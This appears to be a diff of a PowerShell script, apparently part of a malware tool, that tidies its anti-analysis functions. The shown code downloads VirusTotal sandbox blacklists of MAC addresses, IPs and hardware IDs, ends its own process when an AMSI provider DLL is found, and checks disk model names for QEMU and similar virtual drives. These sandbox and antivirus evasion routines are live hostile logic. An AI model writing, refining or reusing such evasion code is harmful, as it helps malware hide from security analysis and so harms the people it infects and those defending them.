@@ -86,15 +86,13 @@ function Invoke-ANTITOTAL {
     $urls = @(
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt"
     )
-
     $functions = @(
         "Search-Mac",
         "Search-IP",
-        "Search-HWID",
+        "Search-HWID"
     )
-
     $data = @()
     foreach ($func in $functions) {
         $data += Invoke-Expression "$func"
@@ -124,7 +122,6 @@ function ram_check {
 function VMPROTECT {
     if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
     ram_check           
-    #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
         ShowError "QEMU HARDDISK"
